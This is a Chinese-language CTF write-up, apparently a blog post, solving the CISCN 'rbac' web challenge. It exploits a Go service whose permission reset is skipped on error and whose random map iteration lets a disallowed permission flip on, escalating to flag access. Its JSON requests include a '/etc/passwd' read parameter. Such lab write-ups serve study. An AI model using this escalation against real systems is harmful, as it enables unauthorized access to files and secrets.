---
date: 2026-01-12
category:
  - CTF
tag:
  - CTF
  - Web
  - CISCN
---

# CISCN-rbac

​	本题是来自国赛，是从Pid那里拿到的，是我第一次对源码进行静态分析。

​	首先我们在本地起一个环境，在输出中我们能看到三个接口

````shell
[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.

[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
 - using env:   export GIN_MODE=release
 - using code:  gin.SetMode(gin.ReleaseMode)

[GIN-debug] GET    /                         --> main.main.func1 (3 handlers)
[GIN-debug] GET    /getCurrentRBAC           --> main.main.func2 (3 handlers)
[GIN-debug] POST   /execSysFunc              --> main.main.func3 (3 handlers)
[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
[GIN-debug] Listening and serving HTTP on :80
````

​	我们主要需要关注的就是下面两个接口：

1. **/getCurrentRBAC**：获取当前角色RBAC状态
2. **/execSysFunc**：根据当前角色RBAC状态执行对应有权限的函数

```go
// 调用execCommand执行具体的系统函数（如getPwd、getDirectory等）
result, err := execCommand(execStruct.FuncName, execStruct.Param)
if err != nil {
	// 若执行失败，构建错误响应
	response = ResTemplate{
		Success: false,
		Data:    map[string]string{"error": err.Error()},
	}
	c.JSON(400, response) // 返回400状态码
} else {
	// 若执行成功，构建成功响应
	response = ResTemplate{
		Success: true,
		Data:    map[string]string{"result": result}, // 携带执行结果
	}
	initRBAC() // 执行完成后重置RBAC权限为初始状态（安全措施，防止权限残留）
	c.JSON(200, response) // 返回200状态码
}
```

​	这里我们需要关注的为`initRBAC()`，它会将RBAC权限重置为初始状态，但是我们可以发现当报错的时候，这时候不会执行`initRBAC()`就会导致RBAC权限残留。

​	默认权限已经权限相关内容如下：

```go
// initRBAC 初始化RBAC权限配置为默认状态
func initRBAC() {
	RBACList = make(map[string]int)
	RBACList["file:read"] = 0          // 文件读取权限
	RBACList["file:return"] = 0        // 返回文件内容权限
	RBACList["flag:read"] = 0          // 标志读取权限
	RBACList["flag:return"] = 0        // 返回标志内容权限
	RBACList["pwd:read"] = 0           // 工作目录读取权限
	RBACList["directory:read"] = 0     // 目录读取权限
	RBACList["directory:return"] = 0   // 返回目录内容权限
	RBACList["rbac:read"] = 1          // 读取RBAC配置权限(始终启用)
	RBACList["rbac:change_read"] = 1   // 修改读取权限的权限(始终启用)
	RBACList["rbac:change_return"] = 0 // 修改返回权限的权限(默认禁用)
}
```

​	我们现在可以通过`change_read`获取flag的read权限，我们可以发送如下请求：

```json	
{
    "File": [
        "read"
    ],
    "Directory": [

    ],
    "Pwd": [

    ],
    "Flag": [
        "read"
    ],
    "Param": "/etc/passwd"
}
```

​	当前权限如下：

```json
{
    "Success": true,
    "Data": {
        "directory:read": 0,
        "directory:return": 0,
        "file:read": 1,
        "file:return": 0,
        "flag:read": 1,
        "flag:return": 0,
        "pwd:read": 0,
        "rbac:change_read": 1,
        "rbac:change_return": 0,
        "rbac:read": 1
    }
}
```

​	此时由于缺少参数，按照程序处理逻辑，跳过了`initRBAC()`不会重置权限，此时我们的目标就是获取到Flag的return权限。

​	为了获取到flag的retuan权限，我们就要卡出`rbac:change_return`为1。

​	在`updateRBAC()`中想要使得`rbac:change_return`为1,那么就要`rbac:change_return:1`，在源代码中

```go
RBACToGrant["rbac:change_return:1"] = 1
RBACToGrant["file:"+value] = 1
RBACToGrant["rbac:change_return:0"] = 1
```

将`rbac:change_return:1`置为1并且将`rbac:change_return:0`也置为1,但是在后续处理中

```go
if strings.HasSuffix(key, ":return") {
	if RBACList["rbac:change_return"] == 1 {
		RBACList[key] = value
	}
} else if key == "rbac:change_return:1" {
	RBACList["rbac:change_return"] = 1
} else if key == "rbac:change_return:0" {
	RBACList["rbac:change_return"] = 0
} else {
	RBACList[key] = value
}
```

​	循环如下(并非固定顺序)

```shell
file:return
rbac:change_return:0
directory:read
file:read
rbac:change_return:1
```

​	这是因为go中map遍历具有随机性，就有可能会出现上面的情况。

​	在最后change_return被赋值为1，此时RBAC状态如下：

```json
{
    "Success": true,
    "Data": {
        "directory:read": 1,
        "directory:return": 0,
        "file:read": 1,
        "file:return": 1,
        "flag:read": 0,
        "flag:return": 0,
        "pwd:read": 0,
        "rbac:change_read": 1,
        "rbac:change_return": 1,
        "rbac:read": 1
    }
}
```

​	我们发送请求如下：

```json
{
    "File": [
    ],
    "Directory": [
    ],
    "Pwd": [
    ],
    "Flag": [
        "read",
        "return"
    ],
    "Param": "/etc/passwd"
}
```

​	此时RBAC状态如下：

```json
{
    "Success": true,
    "Data": {
        "directory:read": 1,
        "directory:return": 0,
        "file:read": 1,
        "file:return": 1,
        "flag:read": 1,
        "flag:return": 1,
        "pwd:read": 0,
        "rbac:change_read": 1,
        "rbac:change_return": 1,
        "rbac:read": 1
    }
}
```

​	此时就可以愉快读flag了😋